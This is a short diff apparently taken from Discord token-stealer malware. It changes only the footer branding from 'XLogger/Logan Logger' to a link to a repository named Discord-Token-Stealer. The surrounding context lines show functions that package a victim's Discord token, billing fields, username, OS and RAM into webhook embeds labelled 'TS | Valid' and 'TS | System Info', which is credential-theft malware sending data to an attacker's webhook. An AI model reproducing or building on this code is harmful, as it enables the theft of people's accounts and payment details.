@@ -79,7 +79,7 @@ def sysinfo(webhook):
                             {"name": "🐏 RAM", "value": f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},
                             {"name": "💻 OS", "value": f"`{plat}`"},
                             {"name": "👤 User", "value": f"`{username}`"}],
-                        "footer": {"text": "Logged by XLogger/Logan Logger https://github.com/xvhjs2/tknstealer-v2"}
+                        "footer": {"text": "https://github.com/xvhjs2/Discord-Token-Stealer"}
                     }
                 ],
                 "username": "TS | System Info"}
@@ -296,7 +296,7 @@ def printtk(webhook, token):
                         {"name": "🪙 Orbs", "value": f"`{orbs}`"},
                         *billing_fields
                     ],
-                    "footer": {"text": "Logged by XLogger/Logan Logger https://github.com/xvhjs2/tknstealer-v2"}
+                    "footer": {"text": "https://github.com/xvhjs2/Discord-Token-Stealer"}
                 }
             ],
             "username": "TS | Valid",
